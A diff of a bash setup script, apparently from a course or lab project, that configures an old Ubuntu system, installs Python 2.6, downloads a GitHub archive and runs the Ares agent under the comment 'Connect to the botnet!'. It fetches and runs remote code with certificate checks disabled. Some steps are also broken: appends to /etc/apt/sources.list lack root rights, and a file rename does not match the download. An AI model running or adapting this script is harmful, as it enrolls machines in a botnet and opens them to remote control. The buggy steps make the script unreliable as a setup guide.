@@ -1,10 +1,17 @@
 #! /bin/bash
-# Start from scratch 12/5/2016
 
-1) edit the sources.list file and add old repo's & python PPA
+# Back up existing file
+sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak
 
+# Add old repositories for software updates
+echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy main restricted universe multiverse" >> /etc/apt/sources.list
+echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-updates main restricted universe multiverse" >> /etc/apt/sources.list
+echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-security main restricted universe multiverse" >> /etc/apt/sources.list
+echo "deb http://ppa.launchpad.net/python-dev/ppa/ubuntu hardy main" >> /etc/apt/sources.list
+
+# Update repository listing and install base packages
 sudo apt-get update
-sudo apt-get install git git-core ssh python2.6
+sudo apt-get install git git-core python2.6
 
 # Install pip for Python 2.6
 wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate && sudo python2.6 get-pip.py
@@ -16,5 +23,5 @@ sudo pip install --upgrade pip && sudo pip install requests
 cd ~ && wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
 mv master master.zip && unzip master.zip
 
-# Connect to the botnet!
+# Connect to the  botnet!
 cd 460SP-master/Ares/agent/python && python2.6 agent.py
